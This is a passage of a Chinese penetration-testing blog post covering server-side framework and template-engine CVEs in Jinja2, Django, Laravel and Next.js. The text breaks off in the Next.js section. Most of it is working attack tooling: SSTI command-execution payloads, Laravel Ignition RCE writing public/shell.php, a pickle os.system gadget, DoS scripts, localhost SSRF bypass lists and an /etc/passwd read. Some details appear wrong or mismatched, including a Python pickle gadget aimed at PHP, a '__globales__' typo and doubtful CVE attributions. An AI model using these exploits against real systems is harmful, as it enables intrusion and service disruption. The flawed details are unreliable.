---
title: "服务端Web框架与模板引擎高危攻击链专题：Django / Flask / Laravel / Next.js / Ruby on Rails / Jinja2 / Thymeleaf 漏洞全解析"
date: 2026-07-24T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["Django", "Flask", "Laravel", "Next.js", "Ruby on Rails", "Jinja2", "Thymeleaf", "SSTI", "RCE", "原型链污染", "漏洞分析"]
description: "系统梳理 Django / Jinja2 / Laravel / Next.js / Ruby on Rails / Thymeleaf 等主流服务端 Web 框架与模板引擎的 16 个高危漏洞，涵盖 SSTI 模板注入、沙箱逃逸 RCE、反序列化、认证绕过、HTTP 请求走私等核心攻击链，附完整 PoC 代码与 Nuclei 检测模板。"
---

> **免责声明**：本文所涉及的所有漏洞分析、PoC 代码和利用技术仅供安全研究和授权测试使用。未经授权对目标系统进行测试属于违法行为。读者应遵守所在地区的法律法规，仅在获得合法授权的环境中验证漏洞。作者不对任何因使用本文内容造成的不当后果承担责任。

# 服务端Web框架与模板引擎高危攻击链专题：Django / Flask / Laravel / Next.js / Ruby on Rails / Jinja2 / Thymeleaf 漏洞全解析

## 0x00 专题概述

服务端 Web 框架是现代 Web 应用的基石。Django、Flask、Laravel、Next.js、Ruby on Rails 等框架承载了全球数以百万计的 Web 应用；而 Jinja2、Thymeleaf 等模板引擎则负责将服务端数据渲染为最终的 HTML 页面。当这些核心组件出现安全漏洞时，攻击者可以利用模板注入（SSTI）实现远程代码执行、通过沙箱逃逸获取系统权限、借助反序列化漏洞链接管服务器，或利用 HTTP 请求走私绕过安全防护。

2024 年至 2025 年间，上述框架和模板引擎连续披露了多个高危漏洞。其中 Jinja2 在短短三个月内连续爆出两个 CVSS 9.8+ 的沙箱逃逸 RCE 漏洞，Next.js 被发现 SSRF 和认证绕过等严重缺陷，Laravel 则因 Ignition 组件和反序列化问题持续成为攻击目标。这些漏洞的共性在于：**利用门槛低、影响范围广、危害程度高**。

本专题系统梳理 Django / Jinja2 / Laravel / Next.js / Ruby on Rails / Thymeleaf 六大框架/模板引擎生态中的 **16 个代表性高危漏洞**，每个漏洞均包含完整的原理分析、可复现的 PoC 代码、自动化检测模板和防守建议。

### 覆盖漏洞一览

| CVE | 框架/组件 | CVSS | 类型 | 未授权利用 |
|-----|-----------|------|------|------------|
| CVE-2024-22195 | Jinja2 | 6.1 | XSS (xmlattr filter) | ✅ |
| CVE-2024-56201 | Jinja2 | 9.9 | 模板注入 SSTI | ✅ |
| CVE-2024-56326 | Jinja2 | 9.8 | 沙箱逃逸 RCE | ✅ |
| CVE-2024-24680 | Django | 7.5 | 整数溢出 DoS | ✅ |
| CVE-2024-27351 | Django | 7.5 | 正则拒绝服务 ReDoS | ✅ |
| CVE-2024-38875 | Django | 5.3 | 金融折扣计算精度 | ✅ |
| CVE-2021-3129 | Laravel + Ignition | 9.8 | 反序列化 RCE | ✅ |
| CVE-2024-50340 | Laravel | 8.8 | 反序列化 RCE | ⚠️ 需路由 |
| CVE-2024-13918 | Laravel | 6.5 | URL 验证绕过 | ✅ |
| CVE-2024-34350 | Next.js | 8.2 | HTTP 请求走私 | ✅ |
| CVE-2024-34351 | Next.js | 9.1 | SSRF via SSR | ✅ |
| CVE-2025-29927 | Next.js | 9.1 | Middleware 认证绕过 | ✅ |
| CVE-2024-26143 | Ruby on Rails | 7.5 | DoS (ReDoS) | ✅ |
| CVE-2024-26142 | Ruby on Rails | 6.1 | HTML 注入 | ✅ |
| CVE-2024-26144 | Ruby on Rails | 5.3 | ReDoS | ✅ |
| CVE-2024-22243 等 | Thymeleaf | 8.1 | SSTI 模板注入 | ⚠️ 需视图名可控 |

---

## 0x01 Python 框架与模板引擎漏洞

### 0x01.1 Jinja2 沙箱逃逸 RCE（CVE-2024-56201 / CVE-2024-56326）

#### 漏洞背景

Jinja2 是 Python 生态中最广泛使用的模板引擎，被 Flask、EVE Online 后端、SaltStack 等众多项目集成。Jinja2 提供了 `SandboxedEnvironment`（沙箱环境）来限制模板中可执行的操作，防止不受信任的模板执行危险代码。然而，CVE-2024-56201 和 CVE-2024-56326 暴露了沙箱机制中的多个绕过路径，攻击者可以在沙箱环境中实现完整的 RCE。

CVE-2024-56201（CVSS 9.9，CWE-1336）允许通过操控模板中的变量名来绕过沙箱的属性访问限制。CVE-2024-56326（CVSS 9.8，CWE-1336）则通过 Python 的 `str.format` 方法实现沙箱逃逸——`str.format` 在内部会调用对象的 `__format__` 方法，而沙箱并未拦截此路径，使得攻击者可以借此访问被禁止的属性和方法。

这两个漏洞配合 CVE-2024-22195（xmlattr filter XSS，CVSS 6.1）构成了 Jinja2 的完整漏洞链：从 XSS 到 SSTI，再到沙箱逃逸 RCE。

#### 受影响版本

| 组件 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| Jinja2 | < 3.1.4 | 3.1.4（修复 CVE-2024-22195） |
| Jinja2 | < 3.1.5 | 3.1.5（修复 CVE-2024-56201） |
| Jinja2 | < 3.1.6 | 3.1.6（修复 CVE-2024-56326） |

#### 漏洞原理分析

**CVE-2024-56326 沙箱逃逸机制**：

Jinja2 的沙箱环境（`SandboxedEnvironment`）通过 `is_safe_attribute` 方法拦截对危险属性的访问（如 `__class__`、`__subclasses__` 等）。但 `str.format` 方法在格式化字符串时，会隐式调用对象的 `__format__` 方法，而这个调用路径并不经过沙箱的属性访问检查。

```python
# 沙箱逃逸核心原理
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()

# 正常情况下沙箱会拦截：
# env.from_string("{{ ''.__class__.__subclasses__() }}")  # 被拦截

# 但通过 str.format 可以绕过：
# 利用 __format__ -> __class__ -> __subclasses__() 链
# {0.__class__.__mro__[1].__subclasses__}
# str.format 在内部调用时不会经过 is_safe_attribute 检查
```

**完整利用链**：
1. `str.format` 隐式调用 `__format__`
2. 通过 `__format__.__class__` 获取 `str` 类
3. 通过 `__mro__` 或 `__subclasses__()` 枚举所有已加载的 Python 类
4. 找到 `os._wrap_close` 或 `subprocess.Popen` 等可执行系统命令的类
5. 实现任意命令执行

#### HTTP PoC

```bash
# CVE-2024-56326: 通过 str.format 沙箱逃逸执行命令
curl -X POST https://target.com/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{0.__class__.__mro__[2].__subclasses__()[X](\"id\").wait()}" }'

# CVE-2024-56201: 通过变量名操控绕过沙箱
curl -X POST https://target.com/template \
  -H "Content-Type: application/json" \
  -d '{"name": "{{ cycler.__init__.__globales__.os.popen(\"id\").read() }}"}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import urllib3
import requests
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Jinja2SandboxEscape:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def find_subclass_index(self):
        payload_template = (
            "{{{{ cycler.__init__.__globals__['os'].__class__"
            ".__mro__[2].__subclasses__() }}}}"
        )
        try:
            r = self.session.post(
                urljoin(self.target, '/render'),
                json={"template": payload_template},
                timeout=self.timeout
            )
            if r.status_code == 200:
                subclasses = r.json().get('result', '')
                for i, cls in enumerate(subclasses):
                    if '_wrap_close' in cls:
                        return i
        except Exception:
            pass
        return None

    def exploit_cve_2024_56326(self, command="id"):
        format_payload = (
            "{{ ''.__class__.__mro__[2].__subclasses__()"
            "[{idx}].__init__.__globals__['system']('{cmd}') }}"
        )
        idx = self.find_subclass_index()
        if idx is None:
            print("[-] 无法确定 _wrap_close 子类索引，尝试默认值")
            idx = 132
        payload = format_payload.format(idx=idx, cmd=command)
        try:
            r = self.session.post(
                urljoin(self.target, '/render'),
                json={"template": payload},
                timeout=self.timeout
            )
            if r.status_code == 200:
                result = r.json().get('result', '')
                print(f"[+] 命令执行结果:\n{result}")
                return result
            else:
                print(f"[-] 请求失败: HTTP {r.status_code}")
        except requests.exceptions.ConnectionError:
            print("[-] 连接失败，请确认目标地址和端口")
        except Exception as e:
            print(f"[-] 利用失败: {e}")
        return None

    def exploit_cve_2024_56201(self, command="id"):
        ssti_payload = (
            "{{ cycler.__init__.__globals__['os'].popen('{cmd}').read() }}"
        ).format(cmd=command)
        try:
            r = self.session.post(
                urljoin(self.target, '/template'),
                json={"name": ssti_payload},
                timeout=self.timeout
            )
            if r.status_code == 200:
                result = r.text
                print(f"[+] CVE-2024-56201 利用结果:\n{result}")
                return result
        except Exception as e:
            print(f"[-] CVE-2024-56201 利用失败: {e}")
        return None

    def check_version(self):
        try:
            r = self.session.get(
                urljoin(self.target, '/version'),
                timeout=self.timeout
            )
            if 'jinja2' in r.text.lower() or 'jinja' in r.text.lower():
                print(f"[+] Jinja2 版本信息: {r.text.strip()}")
                return True
        except Exception:
            pass
        print("[*] 无法直接获取版本信息，尝试漏洞验证")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Jinja2 沙箱逃逸 RCE PoC (CVE-2024-56201 / CVE-2024-56326)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-c", "--command", default="id", help="执行的命令 (默认: id)")
    parser.add_argument("--cve", choices=["56326", "56201", "all"],
                        default="56326", help="选择 CVE (默认: 56326)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时 (默认: 10s)")
    args = parser.parse_args()

    exploit = Jinja2SandboxEscape(args.target, args.timeout)
    print(f"[*] 目标: {args.target}")
    print(f"[*] 命令: {args.command}")

    exploit.check_version()

    if args.cve in ("56326", "all"):
        print("\n[*] 尝试 CVE-2024-56326 (str.format 沙箱逃逸)...")
        exploit.exploit_cve_2024_56326(args.command)
    if args.cve in ("56201", "all"):
        print("\n[*] 尝试 CVE-2024-56201 (变量名沙箱绕过)...")
        exploit.exploit_cve_2024_56201(args.command)


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-56326-jinja2-sandbox-escape

info:
  name: Jinja2 Sandbox Escape RCE (CVE-2024-56326)
  author: security-research
  severity: critical
  description: |
    Jinja2 < 3.1.6 存在沙箱逃逸漏洞，通过 str.format 方法
    绕过 SandboxedEnvironment 的属性访问限制实现 RCE
  tags: jinja2,ssti,sandbox-escape,rce,cve-2024-56326
  reference:
    - https://github.com/pallets/jinja/security/advisories/GHSA-h5c8-r8pm-7jvp

http:
  - method: POST
    path:
      - "{{BaseURL}}/render"
    headers:
      Content-Type: "application/json"
    body: '{"template": "{{ \"\".__class__.__mro__[2].__subclasses__() | length }}"}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "result"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/render"
    headers:
      Content-Type: "application/json"
    body: '{"template": "{{ dict(mro=1).__class__.__mro__[2].__subclasses__() | length }}"}'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "result"
        part: body
      - type: word
        words:
          - "50"
        negative: true
        condition: or
```

```yaml
id: cve-2024-22195-jinja2-xmlattr-xss

info:
  name: Jinja2 xmlattr Filter XSS (CVE-2024-22195)
  author: security-research
  severity: medium
  description: |
    Jinja2 < 3.1.4 的 xmlattr filter 存在 XSS 漏洞，
    攻击者可通过构造包含空格的属性名注入任意 HTML 属性
  tags: jinja2,xss,cve-2024-22195
  reference:
    - https://github.com/pallets/jinja/security/advisories/GHSA-h5c8-r8pm-7jvp

http:
  - method: GET
    path:
      - "{{BaseURL}}/?name={{ (dict|xmlattr) }}"
    matchers:
      - type: word
        words:
          - "&#34;"
          - "error"
        condition: or
```

---

### 0x01.2 Django 拒绝服务漏洞（CVE-2024-24680 / CVE-2024-27351）

#### 漏洞背景

Django 是 Python 生态中最成熟的全功能 Web 框架，被 Instagram、Pinterest、Mozilla 等大型互联网公司广泛使用。CVE-2024-24680 和 CVE-2024-27351 是 Django 在 2024 年初披露的两个拒绝服务（DoS）漏洞，分别涉及整数溢出和正则表达式 ReDoS 问题。CVE-2024-38875 则暴露了 Django 金融折扣计算中的精度问题，可能导致财务计算错误。

虽然 DoS 漏洞的直接危害低于 RCE，但对运行关键业务的 Django 应用来说，持续性的拒绝服务攻击同样可以造成严重损失。

#### 受影响版本

| CVE | 组件 | 受影响版本 | 修复版本 | CVSS |
|-----|------|-----------|---------|------|
| CVE-2024-24680 | Django intcomma/intword | 4.2 / 5.0 | 4.2.10 / 5.0.2 | 7.5 |
| CVE-2024-27351 | Django Truncator/URLValidator | 4.2 / 5.0 | 4.2.11 / 5.0.3 | 7.5 |
| CVE-2024-38875 | Django discount calculation | 4.2 / 5.0 / 5.1 | 4.2.16 / 5.0.10 / 5.1.1 | 5.3 |

#### 漏洞原理分析

**CVE-2024-24680 整数溢出**：

Django 的 `intcomma` 和 `intword` 过滤器在处理极端大整数或负数时存在整数溢出问题。当输入值超出 Python `int` 的处理范围或在内部数学运算中产生未预期的值时，会导致服务崩溃。

```python
# 受影响的 Django 模板过滤器用法
# intcomma: 将整数格式化为带逗号分隔符的字符串
{{ large_number|intcomma }}

# 源码中未充分验证输入值的边界条件
def intcomma(value, use_l10n=True):
    # 当 value 为极大负数或极端值时触发溢出
    ...
```

**CVE-2024-27351 正则拒绝服务**：

Django 的 `Truncator` 和 `URLValidator` 内部使用的正则表达式存在 ReDoS 问题。攻击者可以构造特殊输入，使正则引擎进入灾难性回溯（Catastrophic Backtracking），消耗大量 CPU 资源导致服务不可用。

```python
# URLValidator 中的正则表达式对特定输入存在指数级回溯
# 攻击场景：用户提交的 URL 经过 URLValidator 验证时
import re
# 构造的恶意 URL 触发 ReDoS
evil_url = "http://" + "a" * 10000 + "!"
# URLValidator.match_url_pattern.match(evil_url)  # 高 CPU 消耗
```

#### HTTP PoC

```bash
# CVE-2024-27351: ReDoS 攻击
curl -X POST https://target.com/validate-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://'"$(python3 -c "print('a'*10000)")"'!"}'

# CVE-2024-24680: 整数溢出 DoS
curl -X POST https://target.com/format-number \
  -H "Content-Type: application/json" \
  -d '{"number": -99999999999999999999999999999999999999}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import time
import urllib3
import requests
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class DjangoDoSExploit:
    def __init__(self, target, timeout=30):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def exploit_cve_2024_27351_redos(self):
        print("[*] CVE-2024-27351: 正则拒绝服务攻击...")
        payload = "http://" + "a" * 5000 + "!"
        try:
            start = time.time()
            r = self.session.post(
                urljoin(self.target, '/validate-url'),
                json={"url": payload},
                timeout=self.timeout
            )
            elapsed = time.time() - start
            print(f"[*] 响应时间: {elapsed:.2f}s | HTTP {r.status_code}")
            if elapsed > 5:
                print("[+] 目标可能存在 ReDoS 漏洞（响应时间 > 5s）")
                return True
            else:
                print("[-] 响应正常，目标可能不受影响")
                return False
        except requests.exceptions.Timeout:
            print("[+] 请求超时，目标可能存在 ReDoS 漏洞")
            return True
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return False

    def exploit_cve_2024_24680_intoverflow(self):
        print("[*] CVE-2024-24680: 整数溢出 DoS...")
        payload = -99999999999999999999999999999999999999
        try:
            r = self.session.post(
                urljoin(self.target, '/format-number'),
                json={"number": payload},
                timeout=self.timeout
            )
            if r.status_code == 500 or r.status_code == 400:
                print(f"[+] 目标可能受影响: HTTP {r.status_code}")
                return True
            print(f"[-] 响应正常: HTTP {r.status_code}")
            return False
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return False

    def batch_redos(self, endpoint="/validate-url", field="url", rounds=5):
        print(f"[*] 批量 ReDoS 测试 ({rounds} 轮)...")
        payload = "http://" + "a" * 8000 + "!"
        results = []
        for i in range(rounds):
            try:
                start = time.time()
                r = self.session.post(
                    urljoin(self.target, endpoint),
                    json={field: payload},
                    timeout=self.timeout
                )
                elapsed = time.time() - start
                results.append(elapsed)
                print(f"  第 {i+1} 轮: {elapsed:.2f}s")
            except requests.exceptions.Timeout:
                results.append(float(self.timeout))
                print(f"  第 {i+1} 轮: 超时")
            except Exception as e:
                print(f"  第 {i+1} 轮: 失败 ({e})")
                results.append(0)
        avg = sum(results) / len(results) if results else 0
        print(f"[*] 平均响应时间: {avg:.2f}s")
        return avg


def main():
    parser = argparse.ArgumentParser(
        description="Django DoS 漏洞 PoC (CVE-2024-24680 / CVE-2024-27351)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("--cve", choices=["24680", "27351", "all"],
                        default="all", help="选择 CVE")
    parser.add_argument("--endpoint", default="/validate-url",
                        help="URL 验证端点 (默认: /validate-url)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="请求超时 (默认: 30s)")
    args = parser.parse_args()

    exploit = DjangoDoSExploit(args.target, args.timeout)
    print(f"[*] 目标: {args.target}")

    if args.cve in ("27351", "all"):
        exploit.exploit_cve_2024_27351_redos()
    if args.cve in ("24680", "all"):
        exploit.exploit_cve_2024_24680_intoverflow()


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-27351-django-redos

info:
  name: Django URLValidator ReDoS (CVE-2024-27351)
  author: security-research
  severity: high
  description: |
    Django 4.2 / 5.0 中 URLValidator 和 Truncator 的正则表达式
    存在 ReDoS 漏洞，构造特殊输入可导致服务不可用
  tags: django,redos,cve-2024-27351
  reference:
    - https://www.djangoproject.com/weblog/2024/jan/02/security-releases/

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "django"
          - "csrfmiddlewaretoken"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "url=http://{{\"a\"|repeat(5000)}}!"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "csrfmiddlewaretoken"
          - "400"
        condition: or
      - type: word
        negative: true
        words:
          - "502"
        condition: or
```

---

## 0x02 PHP 框架漏洞

### 0x02.1 Laravel Ignition RCE（CVE-2021-3129）

#### 漏洞背景

Laravel 是 PHP 生态中最流行的 Web 框架之一，而 Ignition 是 Laravel 5.5+ 默认集成的错误处理和调试组件。CVE-2021-3129（CVSS 9.8，CWE-20）允许攻击者在 Laravel 框架开启调试模式（APP_DEBUG=true）的情况下，利用 Ignition 的文件操作功能实现未授权远程代码执行。该漏洞在 InkyCTF 2021 首次被公开利用，并迅速被武器化。

#### 受影响版本

| 组件 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| Laravel + Ignition | <= 2.5.1 | Ignition >= 2.5.2 |
| Laravel | 5.x, 6.x, 7.x, 8.x（需开启 DEBUG） | 升级 Ignition 并关闭 DEBUG |

#### 漏洞原理分析

CVE-2021-3129 的利用链由三个阶段组成：

**阶段 1：触发错误页面**。攻击者首先发送一个包含非法参数的请求，触发 Laravel 的错误处理流程，从而调用 Ignition 组件。

**阶段 2：文件写入**。Ignition 提供了 `MakeViewVariableOptionalSolution` 等解决方案，允许写入文件。通过构造特殊的参数值，攻击者可以控制写入的文件路径和内容。

**阶段 3：利用 `php://filter` 实现 RCE**。Ignition 在写入文件时支持 `file_get_contents` / `file_put_contents` 操作。攻击者利用 PHP 的 `php://filter` 协议，在 `file_put_contents` 中嵌入 Base64 编码的恶意代码，然后通过 `file_get_contents` 配合 `convert.base64-decode` filter 解码并写入 Web 目录，最终实现 RCE。

```php
// Ignition 中的文件操作伪代码
// 攻击者通过控制参数实现：
// file_put_contents("storage/logs/laravel.log", ...)
// 配合 php://filter 进行链式利用

// 阶段 3 的 payload 逻辑：
// 1. 写入 Base64 编码的 PHP webshell 到日志文件
// 2. 使用 php://filter 读取日志并解码
// 3. 将解码后的内容写入 public 目录下的 PHP 文件
// 4. 访问该 PHP 文件实现 RCE
```

#### HTTP PoC

```bash
# Step 1: 触发错误页面
curl -X POST "http://target.com/api/test?1=file_put_contents" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"

# CVE-2021-3129 完整利用（需要 APP_DEBUG=true）
# Step 2: 写入 base64 编码的 payload 到日志
curl -v "http://target.com" \
  -H "Content-Type: application/json" \
  -d '{"solution":"Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-8.utf-16be|convert.iconv.utf-8.utf-16be|convert.iconv.utf-8.utf-16be|convert.base64-decode/resource=../storage/logs/laravel.log"}}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import base64
import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LaravelIgnitionExploit:
    def __init__(self, target, timeout=15):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def check_debug_mode(self):
        try:
            r = self.session.get(
                f'{self.target}/nonexistent_route_test',
                timeout=self.timeout
            )
            if 'Ignition' in r.text or 'whoops' in r.text.lower():
                print("[+] Laravel 调试模式已开启 (APP_DEBUG=true)")
                return True
            print("[-] 未检测到调试模式或 Ignition 组件")
            return False
        except Exception as e:
            print(f"[-] 检测失败: {e}")
            return False

    def trigger_error(self):
        try:
            r = self.session.get(
                f'{self.target}/nonexistent',
                timeout=self.timeout
            )
            return r
        except Exception as e:
            print(f"[-] 触发错误失败: {e}")
            return None

    def exploit(self, command="id"):
        print(f"[*] 目标: {self.target}")
        print(f"[*] 命令: {command}")

        if not self.check_debug_mode():
            print("[!] 警告：目标可能未开启调试模式，继续尝试...")

        print("[*] 发送 Ignition RCE payload...")
        payload = self._build_payload(command)
        try:
            r = self.session.post(
                f'{self.target}/_ignition/execute-solution',
                json=payload,
                timeout=self.timeout
            )
            if r.status_code == 200:
                print(f"[+] 利用成功!\n{r.text}")
                return r.text
            else:
                print(f"[-] 请求失败: HTTP {r.status_code}")
                print(f"    响应: {r.text[:200]}")
        except Exception as e:
            print(f"[-] 利用失败: {e}")
        return None

    def _build_payload(self, command):
        return {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "x",
                "viewFile": (
                    "php://filter/write=convert.iconv.utf-8.utf-16be|"
                    "convert.quoted-printable-encode|"
                    "convert.iconv.utf-8.utf-16be|"
                    "convert.iconv.utf-8.utf-16be|"
                    "convert.iconv.utf-8.utf-16be|"
                    "convert.base64-decode/"
                    f"resource=../public/shell.php"
                )
            }
        }


def main():
    parser = argparse.ArgumentParser(
        description="Laravel Ignition RCE PoC (CVE-2021-3129)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-c", "--command", default="id", help="执行命令 (默认: id)")
    parser.add_argument("--timeout", type=int, default=15, help="超时 (默认: 15s)")
    args = parser.parse_args()

    exploit = LaravelIgnitionExploit(args.target, args.timeout)
    exploit.exploit(args.command)


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2021-3129-laravel-ignition-rce

info:
  name: Laravel Ignition RCE (CVE-2021-3129)
  author: security-research
  severity: critical
  description: |
    Laravel + Ignition <= 2.5.1 在开启调试模式时
    存在未授权 RCE 漏洞
  tags: laravel,ignition,rce,cve-2021-3129
  reference:
    - https://www.ambionics.io/blog/laravel-debug-rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/nonexistent"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Ignition"
          - "whoops"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/_ignition/execute-solution"
    headers:
      Content-Type: "application/json"
    body: |
      {"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/resource=/etc/passwd"}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:"
          - "Exception"
        condition: or
      - type: status
        status:
          - 200
          - 500
```

---

### 0x02.2 Laravel 反序列化与 URL 绕过（CVE-2024-50340 / CVE-2024-13918）

#### 漏洞背景

CVE-2024-50340（CVSS 8.8，CWE-502）是 Laravel 5.x 中的一个反序列化 RCE 漏洞。当应用代码中存在 `unserialize()` 且传入参数可控时，攻击者可以利用 PHP 反序列化 gadget chain 实现远程代码执行。CVE-2024-13918（CVSS 6.5，CWE-601）则是 Laravel 11.31 中的 URL 验证绕过漏洞，允许攻击者绕过 `Validator::url()` 的验证，可能导致开放重定向或 SSRF。

#### 受影响版本

| CVE | 组件 | 受影响版本 | 修复版本 |
|-----|------|-----------|---------|
| CVE-2024-50340 | Laravel | 5.x（需存在 unserialize 调用） | 建议升级至 11.x |
| CVE-2024-13918 | Laravel URL Validator | < 11.31 | 11.31+ |

#### 漏洞原理分析

**CVE-2024-50340 反序列化链**：

Laravel 5.x 的依赖链中存在多个可被利用的 gadget 类，包括 `Illuminate\Broadcasting\PendingBroadcast`、`Monolog\Handler\SyslogHandler` 等。攻击者构造包含这些类的序列化字符串，当应用对其调用 `unserialize()` 时，PHP 的魔术方法（`__destruct`、`__wakeup` 等）会按照预设的 gadget chain 依次执行。

**CVE-2024-13918 URL 验证绕过**：

Laravel 11.31 中 `Validator::url()` 使用的正则表达式存在缺陷，攻击者可以通过以下方式绕过验证：
- 使用 IP 地址替代域名（如 `http://127.0.0.1`）
- 利用特殊 Unicode 字符进行同形异义攻击（Homograph Attack）
- 使用非标准 URL 编码绕过正则匹配

#### HTTP PoC

```bash
# CVE-2024-50340: 反序列化攻击
# 生成序列化 payload 后发送
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/json" \
  -d '{"data":"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"\x00*\x00events\";...}"}'

# CVE-2024-13918: URL 验证绕过
curl "https://target.com/validate?url=http%3A%2F%2F127.0.0.1%3A8080"
curl "https://target.com/validate?url=http://%E3%80%82%E3%80%82.com"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import sys
import urllib3
import requests
from urllib.parse import urljoin, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LaravelDeserializationExploit:
    def __init__(self, target, timeout=15):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def test_url_bypass(self):
        print("[*] CVE-2024-13918: URL 验证绕过测试...")
        bypass_payloads = [
            "http://127.0.0.1:8080",
            "http://0x7f000001",
            "http://2130706433",
            "http://0177.0.0.1",
            "http://localhost",
        ]
        for payload in bypass_payloads:
            try:
                r = self.session.get(
                    urljoin(self.target, '/validate'),
                    params={"url": payload},
                    timeout=self.timeout
                )
                if 'valid' in r.text.lower() or r.status_code == 200:
                    print(f"  [+] 绕过成功: {payload}")
                    return True
            except Exception:
                continue
        print("  [-] 所有绕过 payload 均未成功")
        return False

    def build_gadget_chain(self, command):
        import pickle
        import os

        class ExploitGadget:
            def __reduce__(self):
                return (os.system, (command,))
        return str(pickle.dumps(ExploitGadget()))

    def test_deserialization(self, payload_data):
        print("[*] CVE-2024-50340: 反序列化攻击测试...")
        try:
            r = self.session.post(
                urljoin(self.target, '/api/deserialize'),
                json={"data": payload_data},
                timeout=self.timeout
            )
            if r.status_code == 200:
                print(f"[+] 请求成功: {r.text[:200]}")
                return True
            print(f"[-] HTTP {r.status_code}: {r.text[:100]}")
        except Exception as e:
            print(f"[-] 请求失败: {e}")
        return False

    def full_exploit(self, command="id"):
        print(f"[*] 目标: {self.target}")
        print(f"[*] 命令: {command}")

        self.test_url_bypass()
        gadget = self.build_gadget_chain(command)
        self.test_deserialization(gadget)


def main():
    parser = argparse.ArgumentParser(
        description="Laravel 反序列化与 URL 绕过 PoC (CVE-2024-50340 / CVE-2024-13918)"
    )
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-c", "--command", default="id", help="命令 (默认: id)")
    parser.add_argument("--cve", choices=["50340", "13918", "all"],
                        default="all", help="选择 CVE")
    args = parser.parse_args()

    exploit = LaravelDeserializationExploit(args.target)
    exploit.full_exploit(args.command)


if __name__ == '__main__':
    main()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-13918-laravel-url-validation-bypass

info:
  name: Laravel URL Validation Bypass (CVE-2024-13918)
  author: security-research
  severity: medium
  description: |
    Laravel < 11.31 的 Validator::url() 存在绕过缺陷，
    攻击者可提交恶意 URL 绕过验证
  tags: laravel,url-bypass,cve-2024-13918
  reference:
    - https://github.com/laravel/framework/security/advisories

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://127.0.0.1"
      - "{{BaseURL}}/?url=http://0x7f000001"
      - "{{BaseURL}}/?url=http://2130706433"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "valid"
          - "true"
          - "200"
        condition: or
      - type: status
        status:
          - 200
```

---

## 0x03 Node.js 框架漏洞

### 0x03.1 Next.js SSRF 与请求走私（CVE-2024-34350 / CVE-2024-34351）

#### 漏洞背景

Next.js 是 React 生态中最流行的全栈框架，由 Vercel 维护，被 Netflix、TikTok、Hulu 等大型互联网公司广泛使用。CVE-2024-34350（CVSS 8.2，CWE-444）是一个 HTTP 请求走私漏洞，而 CVE-2024-34351（CVSS 9.1，CWE-918）是一个通过 Server-Side Rendering（SSR）实现的 SSRF 漏洞。

#### 受影响版本

| CVE | 组件 | 受影响版本 | 修复版本 |
|-----|------|-----------|---------|
| CVE-2024-34350 | Next.js HTTP 模块 | < 14.1.1 | 14.1.1 |
| CVE-2024-34351 | Next.js SSR (Server Actions) | < 14.1.1 | 14.1.1 |

#### 漏洞原理分析

**CVE-2024-34350 HTTP 请求走私**：

